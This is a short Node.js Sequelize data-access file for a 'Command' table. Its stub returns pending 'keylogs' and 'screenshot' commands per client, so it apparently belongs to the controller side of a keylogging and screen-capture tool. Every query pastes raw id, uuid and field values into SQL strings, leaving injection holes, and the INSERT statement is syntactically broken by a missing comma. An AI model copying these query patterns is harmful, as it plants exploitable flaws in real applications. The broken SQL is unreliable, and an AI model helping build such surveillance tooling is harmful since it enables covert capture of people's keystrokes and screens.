'use strict'

const Command = require('../models/Command')
const { QueryTypes } = require('sequelize')

const commandDao = {

    findOneById: async function (id) {

        const sql = `SELECT * FROM ${Command.tableName} WHERE id = "${id}"`

        const command = await Command.sequelize.query(sql, {
            type: QueryTypes.SELECT,
            plain: true,
            mapToModel: true,
            model: Command
        })

        return command
    },

    findOneByUuid: async function (uuid) {

        const sql = `SELECT * FROM ${Command.tableName} WHERE uuid = "${uuid}"`

        const command = await Command.sequelize.query(sql, {
            type: QueryTypes.SELECT,
            plain: true,
            mapToModel: true,
            model: Command
        })

        return command
    },
    findPendingCommandsByUuid: function (uuid) {
        //Faire la requete à la base de donnée
        //SELECT commandName FROM Command WHERE uuid = :uuid AND pending = 1 (true)

        return [
            'keylogs',
            'screenshot',
            'keylogs'
        ]
    },

    insertOne: async function ({ commandName, fk_clientId, fk_userId}) {

        const sql = `INSERT INTO ${Command.tableName} (commandName, pending, fk_clientId, fk_userId, createdAt, updatedAt) ` +
            `VALUES ("${commandName}", true, "${fk_clientId}", "${fk_userId}" now(), now())`

        await Command.sequelize.query(sql, {
            type: QueryTypes.INSERT
        })
    },
}

module.exports = commandDao